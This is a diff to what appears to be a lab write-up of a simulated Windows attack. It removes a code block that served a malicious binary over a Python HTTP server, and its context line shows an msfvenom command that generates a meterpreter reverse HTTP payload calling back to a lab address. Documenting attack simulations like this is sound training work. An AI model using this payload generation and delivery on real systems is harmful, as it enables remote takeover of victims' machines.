@@ -43,10 +43,6 @@ msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.0.10.3 LPORT=8080 -f e
 ### 2. Delivery Mechanism
 To simulate the payload delivery, I spun up a temporary Python HTTP server on port 8000, allowing the victim machine to download the malicious binary.
 
-```bash
-python3 -m http.server 8000
-```
-
 > ![Downloading Malware](./screenshots/2.python_server_downloading_malware.png)
 
 ---
